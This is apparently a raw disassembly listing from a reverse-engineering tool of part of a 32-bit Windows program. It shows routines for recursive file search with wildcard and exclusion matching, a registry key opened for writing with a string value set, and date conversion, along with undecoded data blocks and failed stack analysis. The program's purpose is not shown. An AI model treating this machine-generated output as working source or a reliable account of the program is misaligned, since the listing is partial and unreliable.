                call    sub_260C
                mov     edx, [ebp+var_4]
                cmp     byte ptr [edx+eax-1], 5Ch ; '\'
                jz      short loc_44EE
                lea     eax, [ebp+var_4]
                mov     edx, 4051F0h
                call    sub_2614

loc_44EE:                               ; CODE XREF: sub_4480+4D↑j
                                        ; sub_4480+5F↑j
                cmp     [ebp+var_8], 0
                jz      short loc_451D
                mov     eax, [ebp+var_8]
                cmp     byte ptr [eax], 5Ch ; '\'
                jnz     short loc_451D
                lea     ecx, [ebp+var_150]
                mov     edx, 2
                mov     eax, [ebp+var_8]
                call    sub_3B28
                mov     edx, [ebp+var_150]
                lea     eax, [ebp+var_8]
                call    sub_252C

loc_451D:                               ; CODE XREF: sub_4480+72↑j
                                        ; sub_4480+7A↑j
                lea     eax, [ebp+var_C]
                mov     ecx, [ebp+var_8]
                mov     edx, [ebp+var_4]
                call    sub_2658
                lea     eax, [ebp+var_14C]
                push    eax
                mov     eax, [ebp+var_C]
                call    sub_280C
                push    eax
                call    sub_3448
                mov     esi, eax
                test    esi, esi
                setnz   al
                jmp     short loc_45A6
; ---------------------------------------------------------------------------

loc_4549:                               ; CODE XREF: sub_4480+128↓j
                test    [ebp+var_14C], 10h
                ja      short loc_4593
                cmp     dword ptr [ebx], 0
                jz      short loc_4566
                mov     eax, ebx
                mov     edx, 4051FCh
                call    sub_2614

loc_4566:                               ; CODE XREF: sub_4480+D8↑j
                push    dword ptr [ebx]
                push    [ebp+var_4]
                lea     eax, [ebp+var_154]
                lea     edx, [ebp+var_120]
                mov     ecx, 104h
                call    sub_25F4
                push    [ebp+var_154]
                mov     eax, ebx
                mov     edx, 3
                call    sub_26CC

loc_4593:                               ; CODE XREF: sub_4480+D3↑j
                lea     eax, [ebp+var_14C]
                push    eax
                push    esi
                call    sub_3450
                cmp     eax, 1
                sbb     eax, eax
                inc     eax

loc_45A6:                               ; CODE XREF: sub_4480+C7↑j
                test    al, al
                jnz     short loc_4549
                push    esi
                call    sub_3440
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4051E2h

loc_45BD:                               ; CODE XREF: CODE:000045E0↓j
                lea     eax, [ebp+var_154]
                mov     edx, 2
                call    sub_24B8
                lea     eax, [ebp+var_C]
                mov     edx, 3
                call    sub_24B8
                retn
sub_4480        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_45BD
; ---------------------------------------------------------------------------
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                dd 0FFFFFFFFh, 1, 5Ch, 0FFFFFFFFh, 1, 3Bh

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4600        proc near               ; CODE XREF: sub_6A78+B9↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                xor     ecx, ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ebx
                mov     ebx, eax
                xor     eax, eax
                push    ebp
                push    405291h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     edx, [ebp+var_C]
                mov     eax, ebx
                call    sub_42D0
                mov     eax, [ebp+var_C]
                push    eax
                lea     edx, [ebp+var_10]
                mov     eax, ebx
                call    sub_42EC
                mov     eax, [ebp+var_10]
                lea     ecx, [ebp+var_4]
                pop     edx
                call    sub_4480
                mov     bl, 1
                jmp     short loc_4670
; ---------------------------------------------------------------------------

loc_4642:                               ; CODE XREF: sub_4600+74↓j
                lea     ecx, [ebp+var_8]
                lea     eax, [ebp+var_4]
                mov     edx, 4052A8h
                call    sub_3B98
                test    bl, bl
                jz      short loc_4668
                mov     eax, [ebp+var_8]
                call    sub_280C
                push    eax
                call    sub_3438
                test    eax, eax
                jnz     short loc_466C

loc_4668:                               ; CODE XREF: sub_4600+54↑j
                xor     eax, eax
                jmp     short loc_466E
; ---------------------------------------------------------------------------

loc_466C:                               ; CODE XREF: sub_4600+66↑j
                mov     al, 1

loc_466E:                               ; CODE XREF: sub_4600+6A↑j
                mov     ebx, eax

loc_4670:                               ; CODE XREF: sub_4600+40↑j
                cmp     [ebp+var_4], 0
                jnz     short loc_4642
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    405298h

loc_4683:                               ; CODE XREF: CODE:00004696↓j
                lea     eax, [ebp+var_10]
                mov     edx, 4
                call    sub_24B8
                retn
sub_4600        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_4683
; ---------------------------------------------------------------------------
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h
                dd 0FFFFFFFFh, 1, 3Bh

; =============== S U B R O U T I N E =======================================


sub_46AC        proc near               ; CODE XREF: sub_68B4+41↓p
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     ebp, ecx
                mov     edi, edx
                mov     esi, eax
                mov     edx, ds:40447Ch
                xor     eax, eax
                call    sub_38F8
                mov     ebx, eax
                push    ebp
                mov     eax, ebx
                mov     ecx, edi
                mov     edx, esi
                call    sub_4A34
                mov     eax, ebx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_46AC        endp


; =============== S U B R O U T I N E =======================================


sub_46D8        proc near               ; CODE XREF: CODE:000046EB↓p
                                        ; sub_4A34+8↓p
                xor     ecx, ecx
                xchg    ecx, [eax+18h]
                jecxz   short locret_46E5
                xchg    eax, ecx
                call    sub_398C

locret_46E5:                            ; CODE XREF: sub_46D8+5↑j
                retn
sub_46D8        endp

; ---------------------------------------------------------------------------
                align 4
                push    ebx
                mov     ebx, eax
                call    sub_46D8
                lea     eax, [ebx+1Ch]
                call    sub_2494
                xchg    eax, ebx
                call    sub_392C
                pop     ebx
                retn

; =============== S U B R O U T I N E =======================================


sub_4700        proc near               ; CODE XREF: sub_4A34+83↓p
                xchg    eax, edx
                push    eax
                call    sub_24E8
                pop     eax
                cmp     dword ptr [eax], 0
                jnz     short locret_471D
                lea     edx, ds:405319h
                jz      sub_25C4
                sub     ch, [esi]
                sub     al, [eax]

locret_471D:                            ; CODE XREF: sub_4700+B↑j
                retn
sub_4700        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4720        proc near               ; CODE XREF: sub_474C+A↓p
                mov     eax, [eax+18h]
                mov     eax, [eax+18h]
                mov     eax, [eax+edx*4]
                retn
sub_4720        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_472C        proc near               ; CODE XREF: sub_68B4+4A↓p
                mov     eax, [eax+18h]
                test    eax, eax
                jz      short locret_4736
                mov     eax, [eax+1Ch]

locret_4736:                            ; CODE XREF: sub_472C+5↑j
                retn
sub_472C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4738        proc near               ; CODE XREF: sub_68B4+71↓p
                                        ; sub_68B4+96↓p
                mov     eax, [eax+18h]
                mov     eax, [eax+18h]
                mov     edx, [eax+edx*4]
                add     edx, 2Ch ; ','
                mov     eax, ecx
                call    sub_25C4
                retn
sub_4738        endp


; =============== S U B R O U T I N E =======================================


sub_474C        proc near               ; CODE XREF: sub_68B4+5D↓p
                push    ebx
                push    esi
                mov     esi, edx
                mov     ebx, eax
                mov     eax, ebx
                mov     edx, esi
                call    sub_4720
                mov     eax, [eax]
                and     eax, 10h
                cmp     eax, 1
                sbb     eax, eax
                inc     eax
                pop     esi
                pop     ebx
                retn
sub_474C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_476C        proc near               ; CODE XREF: sub_4A34+C1↓p

var_130         = dword ptr -130h
var_12C         = dword ptr -12Ch
var_128         = dword ptr -128h
var_124         = dword ptr -124h
var_120         = dword ptr -120h
var_11C         = dword ptr -11Ch
var_118         = dword ptr -118h
var_114         = dword ptr -114h
var_110         = byte ptr -110h
var_D           = byte ptr -0Dh
var_C           = dword ptr -0Ch
var_5           = byte ptr -5
var_4           = dword ptr -4
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFED0h
                push    ebx
                push    esi
                push    edi
                xor     ebx, ebx
                mov     [ebp+var_130], ebx
                mov     [ebp+var_128], ebx
                mov     [ebp+var_12C], ebx
                mov     [ebp+var_120], ebx
                mov     [ebp+var_124], ebx
                mov     [ebp+var_11C], ebx
                mov     [ebp+var_118], ebx
                mov     [ebp+var_114], ebx
                mov     edi, ecx
                mov     esi, edx
                mov     [ebp+var_4], eax
                mov     ebx, [ebp+arg_0]
                xor     eax, eax
                push    ebp
                push    405611h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, ebx
                and     eax, edi
                cmp     ebx, eax
                jz      short loc_47D9
                mov     eax, ebx
                and     eax, 80h
                test    eax, eax
                jnz     short loc_47D9
                xor     eax, eax
                jmp     short loc_47DB
; ---------------------------------------------------------------------------

loc_47D9:                               ; CODE XREF: sub_476C+5C↑j
                                        ; sub_476C+67↑j
                mov     al, 1

loc_47DB:                               ; CODE XREF: sub_476C+6B↑j
                mov     [ebp+var_5], al
                cmp     [ebp+var_5], 0
                jz      loc_49F3
                lea     eax, [ebp+var_110]
                mov     edx, esi
                call    sub_1B70
                lea     eax, [ebp+var_110]
                mov     edx, 405624h
                xor     ecx, ecx
                mov     cl, [eax]
                inc     ecx
                call    sub_19F0
                jz      short loc_4850
                lea     eax, [ebp+var_114]
                mov     edx, esi
                call    sub_25C4
                mov     eax, [ebp+var_114]
                mov     edx, 405630h
                call    sub_2758
                jz      short loc_4850
                mov     eax, ebx
                and     eax, 80h
                test    eax, eax
                jz      short loc_4850
                cmp     ebx, 80h
                jz      short loc_4850
                and     ebx, 10h
                test    ebx, ebx
                jz      short loc_4850
                and     edi, 10h
                test    edi, edi
                jnz     loc_49F3

loc_4850:                               ; CODE XREF: sub_476C+9E↑j
                                        ; sub_476C+BD↑j ...
                mov     [ebp+var_D], 1
                mov     eax, [ebp+var_4]
                mov     eax, [eax+20h]
                mov     edi, [eax+1Ch]
                dec     edi
                test    edi, edi
                jl      loc_49A1
                inc     edi
                mov     [ebp+var_C], 0

loc_486E:                               ; CODE XREF: sub_476C+22F↓j
                mov     eax, [ebp+var_4]
                mov     eax, [eax+20h]
                mov     eax, [eax+18h]
                mov     eax, [eax+18h]
                mov     edx, [ebp+var_C]
                mov     ebx, [eax+edx*4]
                test    ebx, ebx
                jz      loc_4997
                lea     eax, [ebp+var_110]
                mov     edx, ebx
                call    sub_1B70
                lea     eax, [ebp+var_110]
                mov     edx, 405624h
                xor     ecx, ecx
                mov     cl, [eax]
                inc     ecx
                call    sub_19F0
                jz      short loc_48CB
                lea     eax, [ebp+var_118]
                mov     edx, ebx
                call    sub_25C4
                mov     eax, [ebp+var_118]
                mov     edx, 405630h
                call    sub_2758
                jnz     short loc_48D5

loc_48CB:                               ; CODE XREF: sub_476C+13E↑j
                cmp     ebx, esi
                jz      loc_49F3
                jmp     short loc_491C
; ---------------------------------------------------------------------------

loc_48D5:                               ; CODE XREF: sub_476C+15D↑j
                lea     eax, [ebp+var_110]
                mov     edx, esi
                call    sub_1B70
                lea     eax, [ebp+var_110]
                mov     edx, 405624h
                xor     ecx, ecx
                mov     cl, [eax]
                inc     ecx
                call    sub_19F0
                jz      loc_4997
                lea     eax, [ebp+var_11C]
                mov     edx, esi
                call    sub_25C4
                mov     eax, [ebp+var_11C]
                mov     edx, 405630h
                call    sub_2758
                jz      short loc_4997

loc_491C:                               ; CODE XREF: sub_476C+167↑j
                cmp     byte ptr [ebx], 5Eh ; '^'
                jnz     short loc_495C
                lea     eax, [ebp+var_120]
                lea     edx, [ebx+1]
                call    sub_25C4
                mov     eax, [ebp+var_120]
                push    eax
                lea     eax, [ebp+var_124]
                mov     edx, esi
                call    sub_25C4
                mov     eax, [ebp+var_124]
                pop     edx
                call    sub_3C94
                test    al, al
                jz      short loc_4997
                mov     [ebp+var_5], 0
                jmp     loc_49F3
; ---------------------------------------------------------------------------

loc_495C:                               ; CODE XREF: sub_476C+1B3↑j
                mov     [ebp+var_D], 0
                lea     eax, [ebp+var_128]
                mov     edx, ebx
                call    sub_25C4
                mov     eax, [ebp+var_128]
                push    eax
                lea     eax, [ebp+var_12C]
                mov     edx, esi
                call    sub_25C4
                mov     eax, [ebp+var_12C]
                pop     edx
                call    sub_3C94
                test    al, al
                jz      short loc_4997
                mov     [ebp+var_5], 1
                jmp     short loc_49F3
; ---------------------------------------------------------------------------

loc_4997:                               ; CODE XREF: sub_476C+116↑j
                                        ; sub_476C+18B↑j ...
                inc     [ebp+var_C]
                dec     edi
                jnz     loc_486E

loc_49A1:                               ; CODE XREF: sub_476C+F4↑j
                cmp     [ebp+var_D], 0
                jz      short loc_49EA
                lea     eax, [ebp+var_110]
                mov     edx, esi
                call    sub_1B70
                lea     eax, [ebp+var_110]
                mov     edx, 405624h
                xor     ecx, ecx
                mov     cl, [eax]
                inc     ecx
                call    sub_19F0
                jz      short loc_49EA
                lea     eax, [ebp+var_130]
                mov     edx, esi
                call    sub_25C4
                mov     eax, [ebp+var_130]
                mov     edx, 405630h
                call    sub_2758
                jnz     short loc_49EE

loc_49EA:                               ; CODE XREF: sub_476C+239↑j
                                        ; sub_476C+25D↑j
                xor     eax, eax
                jmp     short loc_49F0
; ---------------------------------------------------------------------------

loc_49EE:                               ; CODE XREF: sub_476C+27C↑j
                mov     al, 1

loc_49F0:                               ; CODE XREF: sub_476C+280↑j
                mov     [ebp+var_5], al

loc_49F3:                               ; CODE XREF: sub_476C+76↑j
                                        ; sub_476C+DE↑j ...
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    405618h

loc_4A00:                               ; CODE XREF: CODE:00004A16↓j
                lea     eax, [ebp+var_130]
                mov     edx, 8
                call    sub_24B8
                retn
sub_476C        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_4A00
; ---------------------------------------------------------------------------
                mov     al, [ebp-5]
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------
                dd 2E01h, 0FFFFFFFFh, 2, 2E2Eh

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4A34        proc near               ; CODE XREF: sub_46AC+20↑p

var_154         = dword ptr -154h
var_14C         = byte ptr -14Ch
var_128         = byte ptr -128h
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                push    ebx
                push    edi
                mov     ebx, eax
                pusha
                call    sub_46D8
                call    sub_396C
                mov     [ebx+18h], eax
                popa
                pusha
                lea     eax, [ebx+1Ch]
                call    sub_24E8
                popa
                mov     eax, [ebx+1Ch]
                test    eax, eax
                jz      loc_4B4C
                pusha
                lea     edx, [ebx+1Ch]
                mov     eax, [edx]
                call    sub_41B8
                mov     eax, [ebx+20h]
                test    eax, eax
                jnz     short loc_4AA9
                call    sub_5080
                mov     [ebx+20h], eax
                popa
                pusha
                push    ecx
                xchg    eax, ecx
                mov     edx, 40569Bh
                call    sub_3CD8
                test    al, al
                pop     edx
                jnz     short loc_4A91
                mov     edx, 4056A7h

loc_4A91:                               ; CODE XREF: sub_4A34+56↑j
                mov     eax, [ebx+20h]
                call    sub_50AC
                jmp     short loc_4AA9
; ---------------------------------------------------------------------------
                db 2Ah
                dd 0FF002A2Eh, 1FFFFFFh, 2A000000h
                db 0
; ---------------------------------------------------------------------------

loc_4AA9:                               ; CODE XREF: sub_4A34+3B↑j
                                        ; sub_4A34+65↑j
                popa
                add     esp, 0FFFFFEC0h
                xor     edx, edx
                push    edx
                push    edx
                xchg    eax, ecx
                mov     edx, esp
                call    sub_4700
                lea     eax, [esp+150h+var_14C]
                mov     edx, [ebx+1Ch]
                pop     ecx
                push    ecx
                call    sub_2658
                call    sub_38A8
                pop     eax
                mov     edx, esp
                push    eax
                push    edx
                push    eax
                call    sub_3448
                mov     edi, eax
                inc     eax
                mov     eax, esp
                pushf
                call    sub_2494
                popf
                pop     ecx
                jz      short loc_4B46

loc_4AE9:                               ; CODE XREF: sub_4A34+10A↓j
                mov     ecx, [esp+154h+var_154]
                push    [ebp+arg_0]
                lea     edx, [esp+158h+var_128]
                mov     eax, ebx
                call    sub_476C
                test    al, al
                jz      short loc_4B35
                mov     ecx, [ebx+24h]
                jecxz   short loc_4B17
                mov     eax, [ebx+28h]
                mov     ecx, esp
                push    1
                mov     edx, esp
                push    edx
                mov     edx, ebx
                call    dword ptr [ebx+24h]
                pop     ecx
                jecxz   short loc_4B35
                loop    loc_4B46

loc_4B17:                               ; CODE XREF: sub_4A34+CD↑j
                mov     eax, 140h
                push    eax
                call    sub_1848
                push    eax
                xchg    eax, edx
                mov     eax, [ebx+18h]
                call    sub_39E8
                pop     edx
                pop     ecx
                mov     eax, esp
                call    sub_194C

loc_4B35:                               ; CODE XREF: sub_4A34+C8↑j
                                        ; sub_4A34+DF↑j
                push    esp
                push    edi
                call    sub_3450
                test    eax, eax
                jnz     short loc_4AE9
                push    edi
                call    sub_3440

loc_4B46:                               ; CODE XREF: sub_4A34+B3↑j
                                        ; sub_4A34+E1↑j
                add     esp, 140h

loc_4B4C:                               ; CODE XREF: sub_4A34+25↑j
                xor     eax, eax
                xchg    eax, [ebx+20h]
                call    sub_3920
                pop     edi
                pop     ebx
                pop     ebp
                retn    4
sub_4A34        endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================


sub_4B5C        proc near               ; CODE XREF: sub_6DA0+BB↓p

var_C           = dword ptr -0Ch

                push    ebx
                push    esi
                push    ecx
                mov     esi, edx
                mov     ebx, eax
                push    esp
                push    2001Fh
                push    0
                mov     eax, esi
                call    sub_280C
                push    eax
                push    ebx
                call    sub_33E8
                test    eax, eax
                jz      short loc_4B82
                xor     eax, eax
                mov     [esp+0Ch+var_C], eax

loc_4B82:                               ; CODE XREF: sub_4B5C+1F↑j
                mov     eax, [esp+0Ch+var_C]
                pop     edx
                pop     esi
                pop     ebx
                retn
sub_4B5C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4B8C        proc near               ; CODE XREF: sub_6DA0+FD↓p
                push    ebx
                push    esi
                push    edi
                mov     esi, ecx
                mov     edi, edx
                mov     ebx, eax
                test    ebx, ebx
                jz      short loc_4BC0
                mov     eax, esi
                call    sub_260C
                inc     eax
                push    eax
                mov     eax, esi
                call    sub_280C
                push    eax
                push    1
                push    0
                mov     eax, edi
                call    sub_280C
                push    eax
                push    ebx
                call    sub_33F0
                test    eax, eax
                jz      short loc_4BC4

loc_4BC0:                               ; CODE XREF: sub_4B8C+B↑j
                xor     eax, eax
                jmp     short loc_4BC6
; ---------------------------------------------------------------------------

loc_4BC4:                               ; CODE XREF: sub_4B8C+32↑j
                mov     al, 1

loc_4BC6:                               ; CODE XREF: sub_4B8C+36↑j
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_4B8C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4BCC        proc near               ; CODE XREF: sub_6DA0+104↓p
                test    eax, eax
                jz      short locret_4BD6
                push    eax
                call    sub_33E0

locret_4BD6:                            ; CODE XREF: sub_4BCC+2↑j
                retn
sub_4BCC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4BD8        proc near               ; CODE XREF: sub_620C+1C↓p
                                        ; sub_6294+5F↓p

var_1C          = qword ptr -1Ch
var_10          = byte ptr -10h

                add     esp, 0FFFFFFE8h
                lea     eax, [esp+18h+var_10]
                push    eax
                call    sub_3488
                mov     edx, esp
                lea     eax, [esp+18h+var_10]
                call    sub_4C34
                fld     [esp+18h+var_1C+4]
                add     esp, 18h
                retn
sub_4BD8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4BF8        proc near               ; CODE XREF: sub_4C34+1D↓p
                push    ebx
                push    esi
                mov     ecx, eax
                movzx   eax, cx
                and     eax, 3
                test    eax, eax
                jnz     short loc_4C27
                movzx   ebx, cx
                mov     eax, ebx
                mov     esi, 64h ; 'd'
                xor     edx, edx
                div     esi
                test    edx, edx
                jnz     short loc_4C2C
                mov     eax, ebx
                mov     ecx, 190h
                xor     edx, edx
                div     ecx
                test    edx, edx
                jz      short loc_4C2C

loc_4C27:                               ; CODE XREF: sub_4BF8+C↑j
                xor     eax, eax
                pop     esi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_4C2C:                               ; CODE XREF: sub_4BF8+1E↑j
                                        ; sub_4BF8+2D↑j
                mov     al, 1
                pop     esi
                pop     ebx
                retn
sub_4BF8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4C34        proc near               ; CODE XREF: sub_4BD8+13↑p

var_1C          = dword ptr -1Ch
var_18          = byte ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h

                push    ebx
                push    esi
                push    edi
                add     esp, 0FFFFFFF0h
                mov     [esp+1Ch+var_1C], edx
                mov     ebx, eax
                mov     [esp+1Ch+var_18], 0
                mov     eax, [esp+1Ch+var_1C]
                xor     edx, edx
                mov     [eax], edx
                mov     [eax+4], edx
                mov     ax, [ebx]
                call    sub_4BF8
                and     eax, 7Fh
                lea     eax, [eax+eax*2]
                lea     edi, ds:4090B4h[eax*8]
                cmp     word ptr [ebx], 270Fh
                ja      loc_4D59
                cmp     word ptr [ebx+2], 0Ch
                ja      loc_4D59
                movzx   eax, word ptr [ebx+2]
                mov     ax, [edi+eax*2-2]
                cmp     ax, [ebx+6]
                jb      loc_4D59
                cmp     word ptr [ebx+8], 18h
                jnb     loc_4D59
                cmp     word ptr [ebx+0Ah], 3Ch ; '<'
                jnb     loc_4D59
                cmp     word ptr [ebx+0Ch], 3Ch ; '<'
                jnb     loc_4D59
                cmp     word ptr [ebx+0Eh], 3E8h
                jnb     loc_4D59
                movzx   esi, word ptr [ebx+6]
                movzx   eax, word ptr [ebx+2]
                dec     eax
                test    eax, eax
                jle     short loc_4CD6
                mov     ecx, 1

loc_4CCB:                               ; CODE XREF: sub_4C34+A0↓j
                movzx   edx, word ptr [edi+ecx*2-2]
                add     esi, edx
                inc     ecx
                dec     eax
                jnz     short loc_4CCB

loc_4CD6:                               ; CODE XREF: sub_4C34+90↑j
                movzx   ecx, word ptr [ebx]
                dec     ecx
                test    ecx, ecx
                jge     short loc_4CE0
                xor     ecx, ecx

loc_4CE0:                               ; CODE XREF: sub_4C34+A8↑j
                mov     eax, ecx
                mov     edi, 64h ; 'd'
                cdq
                idiv    edi
                imul    edi, ecx, 16Dh
                mov     edx, ecx
                test    edx, edx
                jns     short loc_4CF9
                add     edx, 3

loc_4CF9:                               ; CODE XREF: sub_4C34+C0↑j
                sar     edx, 2
                add     edi, edx
                sub     edi, eax
                mov     eax, ecx
                mov     ecx, 190h
                cdq
                idiv    ecx
                add     edi, eax
                add     esi, edi
                mov     [esp+1Ch+var_14], esi
                fild    [esp+1Ch+var_14]
                movzx   eax, word ptr [ebx+8]
                imul    eax, 36EE80h
                movzx   edx, word ptr [ebx+0Ah]
                imul    edx, 0EA60h
                add     eax, edx
                movzx   edx, word ptr [ebx+0Ch]
                imul    edx, 3E8h
                add     eax, edx
                movzx   edx, word ptr [ebx+0Eh]
                add     eax, edx
                mov     [esp+1Ch+var_10], eax
                fild    [esp+1Ch+var_10]
                fdiv    dword ptr ds:405964h
                faddp   st(1), st
                mov     eax, [esp+1Ch+var_1C]
                fstp    qword ptr [eax]
                wait
                mov     [esp+1Ch+var_18], 1

loc_4D59:                               ; CODE XREF: sub_4C34+34↑j
                                        ; sub_4C34+3F↑j ...
                mov     al, [esp+1Ch+var_18]
                add     esp, 10h
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_4C34        endp

; ---------------------------------------------------------------------------
                or      bl, 0A4h
                dec     esp

; =============== S U B R O U T I N E =======================================


sub_4D68        proc near               ; CODE XREF: sub_5F48+77↓p
                mov     cl, 1
                xor     edx, edx
                call    sub_4D90
                retn
sub_4D68        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4D74        proc near               ; CODE XREF: sub_65D0+189↓p
                                        ; sub_6A78+17B↓p ...
                xor     ecx, ecx
                call    sub_4D90
                retn
sub_4D74        endp


; =============== S U B R O U T I N E =======================================


sub_4D7C        proc near               ; CODE XREF: sub_6A78+16B↓p
                                        ; sub_6A78+1DC↓p ...
                call    dword ptr [eax+20h]
                retn
sub_4D7C        endp


; =============== S U B R O U T I N E =======================================


sub_4D80        proc near               ; CODE XREF: sub_4FE8+4B↓p
                                        ; sub_6FD4+15B↓p
                call    dword ptr [eax+24h]
                retn
sub_4D80        endp

; ---------------------------------------------------------------------------
                mov     eax, [eax+40h]
                retn

; =============== S U B R O U T I N E =======================================


sub_4D88        proc near               ; CODE XREF: sub_4FE8+5A↓p
                                        ; sub_4FE8+75↓p ...
                call    dword ptr [eax+28h]
                retn
sub_4D88        endp


; =============== S U B R O U T I N E =======================================


sub_4D8C        proc near               ; CODE XREF: sub_4FE8+2B↓p
                                        ; sub_4FE8+82↓p ...
                call    dword ptr [eax+2Ch]
                retn
sub_4D8C        endp


; =============== S U B R O U T I N E =======================================


sub_4D90        proc near               ; CODE XREF: sub_4D68+4↑p
                                        ; sub_4D74+2↑p ...
                call    dword ptr [eax+1Ch]
                retn
sub_4D90        endp

; ---------------------------------------------------------------------------
                push    eax
                push    dword ptr [eax+50h]
                call    dword ptr [eax+30h]
                pop     eax
                call    sub_3920
                pop     eax
                call    sub_392C
                retn

; =============== S U B R O U T I N E =======================================


sub_4DA8        proc near               ; CODE XREF: sub_4F24+C↓p
                                        ; sub_4F60+7↓p ...
                push    ebx
                push    esi
                mov     esi, eax
                mov     edx, ds:40442Ch
                xor     eax, eax
                call    sub_38F8
                mov     ebx, eax
                lea     edx, [ebx+1Ch]
                mov     eax, esi
                mov     ecx, 20h ; ' '
                call    sub_194C
                lea     eax, [ebx+1Ch]
                mov     [ebx+18h], eax
                mov     eax, ebx
                pop     esi
                pop     ebx
                retn
sub_4DA8        endp

; ---------------------------------------------------------------------------
                align 4
                mov     eax, [eax+40h]
                call    sub_3FB4
                retn
; ---------------------------------------------------------------------------
                align 4
                push    0
                mov     eax, [eax+40h]
                push    eax
                call    sub_3478
                cmp     eax, 0FFFFFFFFh
                jnz     short locret_4DF6
                xor     eax, eax

locret_4DF6:                            ; CODE XREF: CODE:00004DF2↑j
                retn
; ---------------------------------------------------------------------------
                align 4
                retn
; ---------------------------------------------------------------------------
                align 4
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                align 10h
                mov     eax, [eax+40h]
                call    sub_3FC4
                retn
; ---------------------------------------------------------------------------
                align 4
                mov     eax, [eax+40h]
                call    sub_3FE0
                retn
; ---------------------------------------------------------------------------
                align 4
                mov     eax, [eax+40h]
                call    sub_3F90
                retn
; ---------------------------------------------------------------------------
                align 4
                dd 81D38953h, 0FFE1h, 303E200h, 3E24C58h, 3B485803h, 97E4858h
                dd 0E8DA8950h, 0FFFFFF3Ch, 43899358h, 90C35B4Ch, 0C348408Bh
                dd 7D445039h, 8B50522Dh, 0EE33C48h, 1774D285h, 0E83C408Dh
                dd 0FFFFCA20h, 0E89216EBh, 0FFFFC9D8h, 50895892h, 870AEB3Ch
                dd 0E8923C50h, 0FFFFC9E8h, 50895A58h, 4C503948h, 5089037Eh
                dd 0C08BC34Ch, 438B9353h, 3BC8014Ch, 67E4843h, 2B484B8Bh
                dd 8B514C4Bh, 43033C43h, 0CA9EE84Ch, 158FFFFh, 0C35B4C43h
                dd 438B9353h, 3BC8014Ch, 51524843h, 8992087Eh, 0FEB6E8D8h
                dd 5859FFFFh, 33C538Bh, 0E8514C53h, 0FFFFCA74h, 4C430158h
                dd 0C08BC35Bh, 0E33C488Bh, 7DE89106h, 0C3FFFFC9h, 8B575653h
                dd 8BD88BFAh, 0FE6EE8C3h, 0F08BFFFFh, 0C38BD78Bh, 0FFFE6FE8h
                dd 0E8C38BFFh, 0FFFFFE78h, 0E5BEE850h, 0FE3BFFFFh, 0D68B0976h
                dd 55E8C38Bh, 5FFFFFFEh, 90C35B5Eh

; =============== S U B R O U T I N E =======================================


sub_4F24        proc near               ; CODE XREF: sub_6A78+152↓p
                push    ebx
                push    esi
                push    edi
                mov     edi, edx
                mov     esi, eax
                mov     eax, 4090F4h
                call    sub_4DA8
                mov     ebx, eax
                mov     dword ptr [ebx+28h], 405A00h
                mov     dword ptr [ebx+2Ch], 405A0Ch
                mov     dword ptr [ebx+24h], 405AECh
                mov     edx, edi
                mov     eax, esi
                call    sub_3F68
                mov     [ebx+40h], eax
                mov     eax, ebx
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_4F24        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4F60        proc near               ; CODE XREF: sub_6A78+D1↓p
                push    ebx
                xchg    eax, ebx
                mov     eax, 4090F4h
                call    sub_4DA8
                mov     dword ptr [eax+28h], 405A00h
                xchg    eax, ebx
                mov     edx, 80000301h
                call    sub_3F68
                mov     [ebx+40h], eax
                xchg    eax, ebx
                pop     ebx
                retn
sub_4F60        endp


; =============== S U B R O U T I N E =======================================


sub_4F84        proc near               ; CODE XREF: sub_6FD4+C4↓p
                push    ebx
                push    esi
                push    edi
                mov     edi, eax
                mov     eax, 4090F4h
                call    sub_4DA8
